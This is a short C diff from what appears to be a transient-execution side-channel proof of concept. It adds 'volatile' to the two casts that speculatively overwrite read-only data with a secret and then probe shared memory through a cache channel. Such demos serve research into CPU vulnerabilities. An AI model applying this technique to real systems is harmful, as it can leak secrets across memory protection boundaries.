@@ -40,9 +40,9 @@ int main(void) {
       //Null pointer access prolongs transient window
       maccess(0);
       //overwrite read-only data
-      (*((char*)((size_t)function + 32))) = SECRET;
+      (*((volatile char*)((size_t)function + 32))) = SECRET;
       //access shared memory based on overwritten value
-      maccess(mem + *((char*)((size_t)function + 32)) * pagesize);
+      maccess(mem + *((volatile char*)((size_t)function + 32)) * pagesize);
 
       try_abort();
     }
